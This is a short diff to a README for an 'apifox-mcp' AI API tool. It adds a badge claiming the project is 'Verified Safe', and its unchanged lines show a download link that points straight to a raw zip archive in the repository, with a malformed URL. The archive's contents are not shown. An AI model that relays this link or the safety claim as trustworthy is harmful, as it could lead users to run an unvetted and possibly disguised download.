@@ -1,5 +1,7 @@
 # 🚀 apifox-mcp - Easily Manage APIs with AI
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/hafsamudassar-apifox-mcp)
+
 ## 📦 Download Now
 [![Download Release](https://github.com/HafsaMudassar/apifox-mcp/raw/refs/heads/main/apifox_mcp/mcp-apifox-1.7.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/HafsaMudassar/apifox-mcp/raw/refs/heads/main/apifox_mcp/mcp-apifox-1.7.zip)
 
